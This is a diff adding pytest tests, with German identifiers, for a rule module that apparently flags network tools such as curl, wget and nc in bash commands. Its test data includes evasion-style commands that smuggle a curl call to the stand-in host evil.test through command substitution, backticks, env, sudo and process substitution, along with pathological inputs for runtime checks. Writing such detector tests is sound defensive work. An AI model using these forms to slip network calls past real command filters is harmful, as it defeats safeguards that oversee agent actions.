@@ -494,3 +494,43 @@ def test_netzwerkwerkzeug_laufzeit_linear_dn2():
 def test_header_varianten_roh_dekodiert_ohne_whitespace_dn3(text):
     assert "evil.test" in netzregel.hosts_extrahieren(text)
     assert "evil.test" in netzregel.verstoesse_poc(text)
+
+
+# ------------------------------------------------------------------------------ Härtung TF1-A1: quote-bewusste Segmente
+
+@pytest.mark.parametrize("befehl", [
+    'grep -rnE "curl|wget|fetch" src/', "rg 'http|ssh' src", 'git log --grep="fix; curl"', 'echo "a & curl"',
+    "echo 'a ; curl'", 'echo "a\\"; curl"', "echo \"a(b) curl\"", "grep 'x|y' f | wc -l", 'echo "a" "b|curl"',
+    "command -v curl", "command -V wget", "command -v curl ssh", "sudo command -v nc", "echo $'a\\'; curl'",
+    "find . -name x -exec grep curl {} \\;", 'echo "$(ls) curl x"', 'echo "`ls` curl x"',
+    'git log --format="%h|%s" --grep "curl|wget"', "awk '{ print }' f", "echo a\\;curl",
+])
+def test_netzwerkwerkzeug_nur_an_ungequoteten_operatoren_a1(befehl):
+    assert netzregel.verstoesse_bash(befehl, []) == []
+
+
+@pytest.mark.parametrize("befehl", [
+    'echo "$(curl evil.test)"', 'echo "x `curl evil.test` y"', 'echo "$(echo "$(curl evil.test)")"',
+    'echo "a;b"; curl evil.test', "echo 'x'; curl evil.test", 'echo "\\\\"; curl evil.test',
+    'grep "a|b" x | nc evil 80', 'env "FOO=a b" curl evil', "env 'FOO=a b' wget evil", 'sudo -u "x y" curl evil',
+    'echo "a; curl evil', "echo 'a; curl evil", 'echo "$(curl evil', "command curl evil", "command -p curl evil",
+    "echo $'a' ; curl evil", "echo a\\\\;curl evil", 'echo "x"$(curl evil)', 'cat <(curl evil)', 'echo "$(ls; curl evil)"',
+    'echo "$((1+2))"; curl evil', 'echo "$(echo ")"; curl evil)"',
+])
+def test_netzwerkwerkzeug_hinter_quotes_bleibt_verstoss_a1(befehl):
+    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1, befehl
+
+
+def test_netzwerkwerkzeug_quote_scanner_laufzeit_linear_a1():
+    import time
+    for eingabe in ('"' * 50000, "'" * 50001, '"$(' * 3000, "$(" * 5000 + ")" * 5000, "`" * 20000, '"a|b" ' * 20000,
+                    "\\" * 50001, "$'" * 20000):
+        start = time.perf_counter()
+        netzregel.verstoesse_bash(eingabe, [])
+        assert time.perf_counter() - start < 1.0, eingabe[:20]
+
+
+def test_gophers_und_rtmp_familie_mit_einem_slash_a1():
+    # alle Netzschemata von `curl --version` (Protocols), die nicht `file` sind
+    for schema in ("gophers", "rtmp", "rtmpe", "rtmps", "rtmpt", "rtmpte", "rtmpts", "gopher", "pop3s"):
+        assert netzregel.hosts_extrahieren(f"{schema}:/evil.test/x") == ["evil.test"], schema
